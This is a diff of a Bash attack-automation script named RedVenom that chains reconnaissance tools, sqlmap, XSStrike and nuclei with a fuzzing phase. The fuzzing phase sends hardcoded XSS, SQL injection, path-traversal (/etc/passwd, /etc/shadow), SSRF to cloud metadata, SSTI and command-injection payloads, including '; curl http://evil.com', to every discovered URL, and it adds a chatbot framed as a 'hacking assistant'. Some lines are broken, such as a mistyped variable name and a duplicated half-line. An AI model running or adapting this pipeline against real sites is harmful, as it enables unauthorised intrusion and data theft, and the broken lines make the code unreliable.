@@ -26,6 +26,34 @@ manage_jobs() {
         sleep 0.5
     done
 }
+# === TOOL AUTO-DETECTOR (RedVenom v3) ===
+
+SUBFINDER_CMD=$(command -v subfinder 2>/dev/null)
+[[ -z "$SUBFINDER_CMD" ]] && echo -e "${YELLOW}[!] subfinder not found. Recon will be limited.${NC}"
+
+HTTPX_CMD=$(command -v httpx 2>/dev/null)
+[[ -z "$HTTPX_CMD" ]] && echo -e "${YELLOW}[!] httpx not found. Subdomain probing skipped.${NC}"
+
+GAU_CMD=$(command -v gau 2>/dev/null)
+[[ -z "$GAU_CMD" ]] && echo -e "${YELLOW}[!] gau not found. Historical URLs skipped.${NC}"
+
+PARAMSPIDER_CMD=$(command -v paramspider 2>/dev/null)
+[[ -z "$PARAMSPIDER_CMD" ]] && echo -e "${YELLOW}[!] paramspider not found. Param discovery limited.${NC}"
+
+ARJUN_CMD=$(command -v arjun 2>/dev/null)
+[[ -z "$ARJUN_CMD" ]] && echo -e "${YELLOW}[!] arjun not found. Hidden param fuzzing skipped.${NC}"
+
+SQLMAP_CMD=$(command -v sqlmap 2>/dev/null)
+[[ -z "$SQLMAP_CMD" ]] && echo -e "${YELLOW}[!] sqlmap not found. SQLi scan disabled.${NC}"
+
+XSSTRIKEreplace_CMD=$(command -v xsstrike 2>/dev/null)
+[[ -z "$XSSTRIKE_CMD" ]] && [[ -f "XSStrike/xsstrike.py" ]] && XSSTRIKE_CMD="python3 XSStrike/xsstrike.py"
+[[ -z "$XSSTRIKE_CMD" ]] && echo -e "${YELLOW}[!] XSStrike not found. XSS scan disabled.${NC}"
+
+NUCLEI_CMD=$(command -v nuclei 2>/dev/null)
+[[ -z "$NUCLEI_CMD" ]] && echo -e "${YELLOW}[!] nuclei not found. Passive scanning skipped.${NC}"
+
+
 
 ask_ai() {
     API_KEY=$(cat ~/.openrouter_key 2>/dev/null)
@@ -34,44 +62,50 @@ ask_ai() {
         return
     fi
 
-    read -p "[?] Ask RedVenom AI anything: " USER_QUERY
-    [[ -z "$USER_QUERY" ]] && echo -e "${RED}[-] No input provided.${NC}" && return
+    echo -e "${CYAN}[*] Starting RedVenom AI session. Type 'exit' to quit.${NC}"
 
-    echo -e "${CYAN}[*] Contacting RedVenom AI using mistralai/mistral-7b-instruct via OpenRouter...${NC}"
+    while true; do
+        read -p "[AI] ➤ " USER_QUERY
+        [[ "$USER_QUERY" == "exit" ]] && echo -e "${CYAN}[*] Ending AI session.${NC}" && break
+        [[ -z "$USER_QUERY" ]] && continue
 
-    RESPONSE=$(curl -s https://openrouter.ai/api/v1/chat/completions \
-        -H "Authorization: Bearer $API_KEY" \
-        -H "Content-Type: application/json" \
-        -d "$(jq -n \
-            --arg model "mistralai/mistral-7b-instruct" \
-            --arg query "$USER_QUERY" \
-            '{
-                model: $model,
-                messages: [
-                    { "role": "system", "content": "You are RedVenom AI, a helpful hacking assistant." },
-                    { "role": "user", "content": $query }
-                ]
-            }')"
-    )
+        RESPONSE=$(curl -s https://openrouter.ai/api/v1/chat/completions \
+            -H "Authorization: Bearer $API_KEY" \
+            -H "Content-Type: application/json" \
+            -d "$(jq -n \
+                --arg model "mistralai/mistral-7b-instruct" \
+                --arg query "$USER_QUERY" \
+                '{
+                    model: $model,
+                    messages: [
+                        { "role": "system", "content": "You are RedVenom AI, a helpful hacking assistant." },
+                        { "role": "user", "content": $query }
+                    ]
+                }')"
+        )
 
-    MESSAGE=$(echo "$RESPONSE" | jq -r '.choices[0].message.content // empty')
-    [[ -z "$MESSAGE" ]] && echo -e "${RED}[-] Failed to get response. Raw API output:${NC}" && echo "$RESPONSE" | jq || {
-        echo -e "${GREEN}[+] AI Response:${NC}"
-        echo "$MESSAGE"
-    }
+        MESSAGE=$(echo "$RESPONSE" | jq -r '.choices[0].message.content // empty')
+        if [[ -z "$MESSAGE" ]]; then
+            echo -e "${RED}[-] No response. Raw output:${NC}"
+            echo "$RESPONSE" | jq
+        else
+            echo -e "${GREEN}[AI]:${NC} $MESSAGE"
+        fi
+    done
 }
 
 summarize_results() {
-    echo -e "${CYAN}[*] Summarizing results with RedVenom AI via OpenRouter...${NC}"
+    echo -e "${CYAN}[*] Generating AI summary from scan results...${NC}"
 
     API_KEY=$(cat ~/.openrouter_key 2>/dev/null)
-    [[ -z "$API_KEY" ]] && echo -e "${RED}[-] No OpenRouter API key found in ~/.openrouter_key${NC}" && return
+    [[ -z "$API_KEY" ]] && echo -e "${RED}[-] No OpenRouter API key found.${NC}" && return
 
     XSSTRIKE_SUMMARY=$(head -c 3000 recon_venom/xsstrike_results.txt 2>/dev/null)
     SQLMAP_SUMMARY=$(find recon_venom/sqlmap_results -name "*.csv" -exec head -c 3000 {} + 2>/dev/null)
-    FUZZ_LOG=$(grep -E '^\[XSS\]|\[SQLi\]|\[LFI\]' recon_venom/fuzzing_log.txt | head -c 3000)
+    FUZZ_LOG=$(grep -E '\[XSS\]|\[SQLi\]|\[LFI\]|\[JSONi\]' recon_venom/fuzzing_log.txt | head -c 3000)
+    NUCLEI=$(head -c 3000 confirmed/nuclei/confirmed_nuclei.txt 2>/dev/null)
 
-    PROMPT="You are a cybersecurity expert. Analyze the following data from a bug bounty recon & scan:\n\n[XSStrike Results]:\n$XSSTRIKE_SUMMARY\n\n[SQLMap Results]:\n$SQLMAP_SUMMARY\n\n[Fuzzing Phase]:\n$FUZZ_LOG\n\nSummarize key findings, severity, and what to focus on."
+    PROMPT="You are a cybersecurity expert. Summarize and prioritize the following findings from a Red Team scan:\n\n[XSStrike]:\n$XSSTRIKE_SUMMARY\n\n[SQLMap]:\n$SQLMAP_SUMMARY\n\n[Fuzzing]:\n$FUZZ_LOG\n\n[Nuclei]:\n$NUCLEI"
 
     RESPONSE=$(curl -s https://openrouter.ai/api/v1/chat/completions \
         -H "Authorization: Bearer $API_KEY" \
@@ -80,7 +114,7 @@ summarize_results() {
 {
   "model": "mistralai/mistral-7b-instruct",
   "messages": [
-    { "role": "system", "content": "You are a cybersecurity expert writing a concise penetration test summary report." },
+    { "role": "system", "content": "You are a cybersecurity expert writing a professional bug bounty scan report with severity classification and remediation suggestions." },
     { "role": "user", "content": "$PROMPT" }
   ]
 }
@@ -88,11 +122,11 @@ EOF
     )
 
     SUMMARY=$(echo "$RESPONSE" | jq -r '.choices[0].message.content // empty')
-    echo -e "\n${GREEN}[+] Summary Report Generated:${NC}"
+    echo -e "\n${GREEN}[+] AI Summary Report:${NC}"
     echo "$SUMMARY"
 
     echo "$SUMMARY" > recon_venom/ai_report.txt
-    echo -e "${CYAN}[✔] Report saved to recon_venom/ai_report.txt${NC}"
+    echo -e "${CYAN}[✔] Saved to recon_venom/ai_report.txt${NC}"
 }
 
 
@@ -120,100 +154,95 @@ else
 fi
 
 mkdir -p recon_venom results
-
-# PHASE 2 — Recon
-
+# PHASE 2 — Enhanced Recon (RedVenom v3)
+# Detect required tools
+SUBFINDER_CMD=$(command -v subfinder)
+HTTPX_CMD=$(command -v httpx)
+GAU_CMD=$(command -v gau)
+PARAMSPIDER_CMD=$(command -v paramspider)
+ARJUN_CMD=$(command -v arjun)
+CURL_CMD=$(command -v curl)
 
 echo -e "${CYAN}[+] Cleaning old recon data...${NC}"
 rm -rf recon_venom/*
-mkdir -p recon_venom
+mkdir -p recon_venom/{js,params}
 
 echo -e "${CYAN}[*] Running Subfinder...${NC}"
-subfinder -d $TARGET -silent -o recon_venom/subdomains.txt & PID1=$!
+$SUBFINDER_CMD -d $TARGET -silent -o recon_venom/subdomains.txt & PID1=$!
 
 echo -e "${CYAN}[*] Running gau...${NC}"
-gau --subs --o recon_venom/gau_urls.txt $TARGET & PID2=$!
-
+$GAU_CMD --subs --o recon_venom/gau_urls.txt $TARGET & PID2=$!
 
 wait $PID1
 echo -e "${CYAN}[*] Running httpx...${NC}"
-httpx -l recon_venom/subdomains.txt -silent -o recon_venom/httpx_live.txt & PID3=$!
+$HTTPX_CMD -l recon_venom/subdomains.txt -silent -o recon_venom/httpx_live.txt & PID3=$!
+
 wait $PID2
 wait $PID3
 
-WAIT_FOR_HTTPX=true
-
 echo -e "${CYAN}[*] Running ParamSpider...${NC}"
-echo -e "${CYAN}[*] Detecting ParamSpider capabilities...${NC}"
-
-PARAMSUPPORTS=$(paramspider --help 2>&1)
-RAW_OUTPUT="recon_venom/paramspider_raw.txt"
-CLEAN_OUTPUT="recon_venom/paramspider_cleaned.txt"
-
+RAW_OUTPUT="recon_venom/params/paramspider_raw.txt"
+CLEAN_OUTPUT="recon_venom/params/paramspider_cleaned.txt"
 > "$RAW_OUTPUT"
 > "$CLEAN_OUTPUT"
 
-if echo "$PARAMSUPPORTS" | grep -qE -- '--domain|-d'; then
-    echo -e "${GREEN}[+] ParamSpider supports modern flags. Running per-domain scan...${NC}"
-    while read -r domain; do
-        [[ -z "$domain" ]] && continue
-        echo -e "${CYAN}[ParamSpider] Scanning $domain${NC}"
-        paramspider -d "$domain" \
-            --quiet \
-            --exclude woff,ttf,svg,png,jpg,jpeg,gif,css,js,ico,bmp,webp \
-            2>/dev/null >> "$RAW_OUTPUT"
-    done < recon_venom/httpx_live.txt
-else
-    echo -e "${YELLOW}[!] ParamSpider doesn't support modern flags. Using legacy mode...${NC}"
-    while read -r domain; do
-        [[ -z "$domain" ]] && continue
-        echo -e "${CYAN}[ParamSpider] Scanning $domain (legacy mode)${NC}"
-        paramspider "$domain" 2>/dev/null >> "$RAW_OUTPUT"
-    done < recon_venom/httpx_live.txt
-fi
+while read -r domain; do
+    [[ -z "$domain" ]] && continue
+    $PARAMSPIDER_CMD -d "$domain" \
+        --quiet \
+        --exclude woff,ttf,svg,png,jpg,jpeg,gif,css,js,ico,bmp,webp \
+        2>/dev/null >> "$RAW_OUTPUT"
+done < recon_venom/httpx_live.txt
 
-# Extract only param URLs 
 grep -Eo 'https?://[^ ]+\?[^ ]+' "$RAW_OUTPUT" | sort -u > "$CLEAN_OUTPUT"
+echo -e "${GREEN}[✔] ParamSpider output saved to:${NC} $CLEAN_OUTPUT"
 
-if [[ ! -s "$CLEAN_OUTPUT" ]]; then
-    echo -e "${YELLOW}[!] No parameterized URLs found by ParamSpider.${NC}"
-fi
+# Hidden Parameter Discovery via Arjun
+echo -e "${CYAN}[*] Running Arjun for hidden parameter discovery...${NC}"
+$ARJUN_CMD -i recon_venom/httpx_live.txt -oT recon_venom/params/arjun_params.txt -t 20 2>/dev/null
 
-echo -e "${GREEN}[✔] ParamSpider finished. Cleaned output saved to:${NC} $CLEAN_OUTPUT"
+# JavaScript link extraction (filtered by target domain)
+echo -e "${CYAN}[*] Finding JS files from gau output...${NC}"
+grep -Ei '\.js($|\?)' recon_venom/gau_urls.txt | grep "$TARGET" | sort -u > recon_venom/js/js_files.txt
 
-# Final deduped cleaned output
-sort -u "$RAW_OUTPUT" > "$CLEAN_OUTPUT"
+echo -e "${CYAN}[*] Extracting endpoints from JS files (filtered)...${NC}"
+> recon_venom/js/endpoints.txt
+while read -r jsurl; do
+    $CURL_CMD -sk "$jsurl" | grep -Eo '[a-zA-Z0-9_\/.-]+?\.(php|asp|aspx|jsp|json|cgi)' >> recon_venom/js/endpoints.txt
+done < recon_venom/js/js_files.txt
+sort -u recon_venom/js/endpoints.txt -o recon_venom/js/endpoints.txt
 
-echo -e "${GREEN}[✔] ParamSpider finished. Cleaned output saved to:${NC} $CLEAN_OUTPUT"
+# Merge Everything
+echo -e "${CYAN}[*] Merging URLs for final list...${NC}"
+cat recon_venom/gau_urls.txt \
+    recon_venom/params/paramspider_cleaned.txt \
+    recon_venom/js/endpoints.txt \
+    recon_venom/params/arjun_params.txt 2>/dev/null | sort -u > recon_venom/all_urls.txt
 
-
-echo -e "${CYAN}[*] Cleaning & Merging URLs...${NC}"
-
+# Optional Filtering
 read -p "[?] Do you want full filtered output (only dynamic pages with params)? (y/n): " FILTER_OPTION
-
 if [[ "$FILTER_OPTION" == "y" ]]; then
     echo -e "${CYAN}[*] Filtering for dynamic URLs only (.php, .asp, .jsp, .cgi)...${NC}"
-    cat recon_venom/*.txt \
-      | grep '?' \
-      | grep -Ei '\.php|\.asp|\.aspx|\.jsp|\.cgi' \
+    grep '?' recon_venom/all_urls.txt | grep -Ei '\.php|\.asp|\.aspx|\.jsp|\.cgi' \
       | grep -vE '\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf)' \
       | sort -u > recon_venom/all_cleaned_urls.txt
 else
     echo -e "${CYAN}[*] Using all parameterized URLs without filtering...${NC}"
-    cat recon_venom/*.txt | grep '?' | sort -u > recon_venom/all_cleaned_urls.txt
+    grep '?' recon_venom/all_urls.txt | sort -u > recon_venom/all_cleaned_urls.txt
 fi
 
+echo -e "${GREEN}[✔] Recon phase complete. Output in:${NC} recon_venom/all_cleaned_urls.txt"
+GREEN}[✔] Recon phase complete. Output in:${NC} recon_venom/all_cleaned_urls.txt"
 
-echo -e "${GREEN}[+] Recon phase complete.${NC}"
+#sqlmap+xsstrike phase
+SQLMAP_CMD=$(command -v sqlmap)
 
-# PHASE 3 — Vulnerability Scanning (SQLMap + XSStrike)
 echo -e "${CYAN}[*] Running SQLMap...${NC}"
-sqlmap -m recon_venom/all_cleaned_urls.txt --batch --random-agent --output-dir=recon_venom/sqlmap_results
+$SQLMAP_CMD -m recon_venom/all_cleaned_urls.txt --batch --random-agent --output-dir=recon_venom/sqlmap_results
 
 echo -e "${CYAN}[*] Running XSStrike on each URL...${NC}"
 
 MAX_XS_JOBS=10
-
 manage_xs_jobs() {
     while [ "$(jobs -rp | wc -l)" -ge "$MAX_XS_JOBS" ]; do
         sleep 0.5
@@ -241,153 +270,136 @@ done < recon_venom/all_cleaned_urls.txt
 
 wait
 echo -e "${GREEN}[+] Cleaned XSStrike results saved in:${NC}"
-echo -e "${CYAN}    - recon_venom/xsstrike_results_clean.txt  (All URLs with status)"
-echo -e "${CYAN}    - recon_venom/xsstrike_vulns.txt         (Only vulnerable URLs)"
-echo -e "${CYAN}    - recon_venom/xsstrike_raw.txt           (Full raw XSStrike logs)${NC}"
+echo -e "${CYAN}    - recon_venom/xsstrike_results_clean.txt"
+echo -e "${CYAN}    - recon_venom/xsstrike_vulns.txt"
+echo -e "${CYAN}    - recon_venom/xsstrike_raw.txt${NC}"
 
 echo -e "${GREEN}[+] Scanning phase complete.${NC}"
 
-# PHASE 4 — Fuzzing (XSS, SQLi, LFI, Open Redirect, SSTI, RCE)
-echo -e "${CYAN}[*] Preparing payload files...${NC}"
-mkdir -p payloads
 
-# Create payloads/xss.txt if it doesn't exist
-if [[ ! -f payloads/xss.txt ]]; then
-cat << 'EOF' > payloads/xss.txt
+# PHASE 4 — Fuzzing (XSS, SQLi, LFI, Redirect, SSTI, RCE, JSONi, SSRF)
+echo -e "${CYAN}[*] Preparing payload files and confirmed folder...${NC}"
+mkdir -p payloads recon_venom/confirmed
+
+# Payload sets
+cat > payloads/xss.txt << 'EOF'
 "><svg/onload=alert(1)>
 "><script>alert(1)</script>
 '><img src=x onerror=alert(1)>
 "><iframe src=javascript:alert(1)>
 "><body onload=alert(1)>
+"><scr<script>ipt>alert(1)</scr</script>ipt>
+"><details/open/ontoggle=alert(1)>
+"><marquee/onstart=alert(1)>
 EOF
-fi
-# Create payloads/sqli.txt if it doesn't exist
-if [[ ! -f payloads/sqli.txt ]]; then
-cat << 'EOF' > payloads/sqli.txt
+
+cat > payloads/sqli.txt << 'EOF'
 ' OR 1=1 --
 " OR "1"="1
 admin' --
-' OR sleep(5)--
-' AND 1=1#
+' OR sleep(5)-- 
+' AND '1'='1
+' or 1=1 limit 1; --
 EOF
-fi
 
-# Create payloads/lfi.txt if it doesn't exist
-if [[ ! -f payloads/lfi.txt ]]; then
-cat << 'EOF' > payloads/lfi.txt
+cat > payloads/lfi.txt << 'EOF'
 ../../../../etc/passwd
 ../../../../../../etc/shadow
 ..%2f..%2f..%2fetc/passwd
 /etc/passwd%00
 ../../../boot.ini
 EOF
-fi
-# Create payloads/open_redirect.txt if it doesn't exist
-if [[ ! -f payloads/open_redirect.txt ]]; then
-cat << 'EOF' > payloads/open_redirect.txt
-//evil.com
+
+cat > payloads/open_redirect.txt << 'EOF'
 http://evil.com
 https://evil.com
+//evil.com
 //google.com%2F%2F@evil.com
 /?next=http://evil.com
 EOF
-fi
 
-# Create payloads/ssrf.txt if it doesn't exist
-if [[ ! -f payloads/ssrf.txt ]]; then
-cat << 'EOF' > payloads/ssrf.txt
+cat > payloads/ssrf.txt << 'EOF'
 http://127.0.0.1
 http://localhost
 http://169.254.169.254
 http://[::1]
 http://0.0.0.0
 EOF
-fi
 
-# Create payloads/rce.txt if it doesn't exist
-if [[ ! -f payloads/rce.txt ]]; then
-cat << 'EOF' > payloads/rce.txt
+cat > payloads/rce.txt << 'EOF'
 ;ls
 | whoami
 && cat /etc/passwd
 ; ping -c 1 127.0.0.1
 ; curl http://evil.com
 EOF
-fi
 
-# Create payloads/ssti.txt if it doesn't exist
-if [[ ! -f payloads/ssti.txt ]]; then
-cat << 'EOF' > payloads/ssti.txt
+cat > payloads/ssti.txt << 'EOF'
 {{7*7}}
 {{1337*1337}}
 \${7*7}
 \${{7*7}}
 <%= 7 * 7 %>
 EOF
-fi
 
-# Create payloads/json.txt if it doesn't exist
-if [[ ! -f payloads/json.txt ]]; then
-cat << 'EOF' > payloads/json.txt
-{"username":"admin", "password":"' OR '1'='1"}
+cat > payloads/json.txt << 'EOF'
+{"username":"admin","password":"' OR '1'='1"}
 {"user":"\${7*7}"}
 {"input":"<script>alert(1)</script>"}
 {"path":"../../../../etc/passwd"}
 {"redirect":"http://evil.com"}
+{"cmd":"__import__('os').system('id')"}
 EOF
-fi
+
+# Confirmed detection logic
 detect_vuln() {
     local url="$1"
     local payload="$2"
     local type="$3"
-
-    response=$(curl -sk "$url" --max-time 10)
+    response=$($CURL_CMD -sk "$url" --max-time 10)
 
     case "$type" in
         "XSS")
             if echo "$response" | grep -qE '<script>alert\(1\)</script>|<svg/onload=alert\(1\)>|onerror=alert'; then
-                echo -e "${GREEN}[VULNERABLE][XSS] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
-            fi
-            ;;
+                echo -e "${GREEN}[VULNERABLE][XSS] $url${NC}" | tee -a recon_venom/confirmed/xss.txt
+            fi ;;
         "SQLi")
             if echo "$response" | grep -qE 'SQL syntax|mysql_fetch|syntax error|unterminated query'; then
-                echo -e "${GREEN}[VULNERABLE][SQLi] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
-            fi
-            ;;
+                echo -e "${GREEN}[VULNERABLE][SQLi] $url${NC}" | tee -a recon_venom/confirmed/sqli.txt
+            fi ;;
         "LFI")
             if echo "$response" | grep -qE 'root:.*:0:0|boot.ini'; then
-                echo -e "${GREEN}[VULNERABLE][LFI] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
-            fi
-            ;;
+                echo -e "${GREEN}[VULNERABLE][LFI] $url${NC}" | tee -a recon_venom/confirmed/lfi.txt
+            fi ;;
         "Redirect")
             if echo "$response" | grep -qi "Location: http://evil.com"; then
-                echo -e "${GREEN}[VULNERABLE][Redirect] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
-            fi
-            ;;
+                echo -e "${GREEN}[VULNERABLE][Redirect] $url${NC}" | tee -a recon_venom/confirmed/redirect.txt
+            fi ;;
         "RCE")
             if echo "$response" | grep -qE 'uid=|root|Administrator'; then
-                echo -e "${GREEN}[VULNERABLE][RCE] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
-            fi
-            ;;
+                echo -e "${GREEN}[VULNERABLE][RCE] $url${NC}" | tee -a recon_venom/confirmed/rce.txt
+            fi ;;
         "SSTI")
             if echo "$response" | grep -qE '49|1787569'; then
-                echo -e "${GREEN}[VULNERABLE][SSTI] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
-            fi
-            ;;
+                echo -e "${GREEN}[VULNERABLE][SSTI] $url${NC}" | tee -a recon_venom/confirmed/ssti.txt
+            fi ;;
         "JSON")
             if echo "$response" | grep -qE 'alert\(1\)|root:|uid=|error'; then
-                echo -e "${GREEN}[VULNERABLE][JSONi] $url${NC}" | tee -a recon_venom/fuzzing_log.txt
-            fi
-            ;;
+                echo -e "${GREEN}[VULNERABLE][JSONi] $url -- Payload: $payload${NC}" | tee -a recon_venom/confirmed/jsoni.txt
+            fi ;;
     esac
 }
 
+# Control job limit
+MAX_JOBS=15
+manage_jobs() {
+    while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
+        sleep 0.3
+    done
+}
 
-echo -e "${GREEN}[+] Payload files ready.${NC}"
+echo -e "${GREEN}[+] Payloads loaded. Starting Fuzzing Phase...${NC}"
 
-
-echo -e "${CYAN}[*] Starting Fuzzing Phase...${NC}"
-# Load payloads by type
 mapfile -t XSS_PAYLOADS < payloads/xss.txt
 mapfile -t SQLI_PAYLOADS < payloads/sqli.txt
 mapfile -t LFI_PAYLOADS < payloads/lfi.txt
@@ -420,9 +432,8 @@ while read -r url; do
 
     for payload in "${SSRF_PAYLOADS[@]}"; do
         fuzzed=$(echo "$url" | sed -E "s/=[^&]*/=$(printf '%s' "$payload" | sed 's/[&/\\]/\\&/g')/g")
-        # Optional: you can enable detect_vuln if you have SSRF detection logic
         echo -e "[SSRF] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
-        curl -sk "$fuzzed" -o /dev/null & manage_jobs
+        $CURL_CMD -sk "$fuzzed" -o /dev/null & manage_jobs
     done
 
     for payload in "${RCE_PAYLOADS[@]}"; do
@@ -437,27 +448,67 @@ while read -r url; do
 
     for payload in "${JSON_PAYLOADS[@]}"; do
         echo -e "[JSON] $url -- POST Payload: $payload" | tee -a recon_venom/fuzzing_log.txt
-        response=$(curl -sk -X POST -H "Content-Type: application/json" -d "$payload" "$url")
+        response=$($CURL_CMD -sk -X POST -H "Content-Type: application/json" -d "$payload" "$url")
         detect_vuln "$url" "$payload" "JSON"
     done
 
 done < recon_venom/all_cleaned_urls.txt
 
+wait
+echo -e "${GREEN}[✔] Fuzzing phase complete. Confirmed results saved in: recon_venom/confirmed/${NC}"
+
+# PHASE 5 — Passive/Active Scanning with Nuclei (Parallel)
+echo -e "${CYAN}[*] Launching Nuclei scanning...${NC}"
+mkdir -p recon_venom/nuclei_results confirmed/nuclei
+
+# Run Nuclei silently and output JSON
+nuclei -l recon_venom/all_cleaned_urls.txt -o recon_venom/nuclei_results/raw.txt -json -silent &
+
+# Parse and extract confirmed vulnerabilities with severity ratings
+{
+    sleep 10  # Give nuclei time to create output
+    echo -e "${CYAN}[*] Extracting and rating confirmed Nuclei findings...${NC}"
+    if [[ -f recon_venom/nuclei_results/raw.txt ]]; then
+        jq -r '.templateID + " | " + .info.name + " | " + .info.severity + " | " + .matched_at' recon_venom/nuclei_results/raw.txt \
+        | tee confirmed/nuclei/confirmed_nuclei.txt > /dev/null
+        echo -e "${GREEN}[+] Nuclei confirmed findings logged at confirmed/nuclei/confirmed_nuclei.txt${NC}"
+    else
+        echo -e "${RED}[-] Nuclei raw output not found. Skipping parsing.${NC}"
+    fi
+} &
 
 # Wait for all background jobs to finish
 wait
-read -p "[?] Do you want to ask RedVenom AI something? (y/n): " AI_OPTION
-if [[ "$AI_OPTION" == "y" ]]; then
-    ask_ai
-fi
-echo -e "${GREEN}[✔] RedVenom v2.2 finished. Results saved in recon_venom/.${NC}"
 
+# Offer AI Assistant or Summary
+echo -e "${CYAN}[✔] All scan phases complete.${NC}"
 
-# PHASE 5 — Cleanup & VPN Disconnect
+ai_menu() {
+    echo -e "\n${CYAN}[!] RedVenom AI Options:${NC}"
+    echo "   1) Ask the AI Assistant"
+    echo "   2) Summarize Findings"
+    echo "   3) Skip"
+
+    while true; do
+        read -p "[?] Choose (1/2/3): " choice
+        case "$choice" in
+            1) ask_ai ;;
+            2) summarize_results ;;
+            3) break ;;
+            *) echo -e "${RED}[-] Invalid option.${NC}" ;;
+        esac
+    done
+}
+
+ai_menu
+
+echo -e "${GREEN}[✔] RedVenom v3 finished. All results saved in ${CYAN}recon_venom/${NC} and ${CYAN}confirmed/${NC} folders.${NC}"
+
+# PHASE 6 — Cleanup & VPN Disconnect
 if [[ "$VPN_OPTION" == "y" ]]; then
     echo -e "${CYAN}[*] Disconnecting VPN...${NC}"
     sudo killall openvpn
     echo -e "${GREEN}[+] VPN disconnected.${NC}"
 fi
 
-echo -e "${GREEN}[✔] RedVenom v2.2 finished. Results saved in recon_venom/.${NC}"
+echo -e "${GREEN}[✔] RedVenom v3 finished. Results saved in recon_venom/.${NC}"
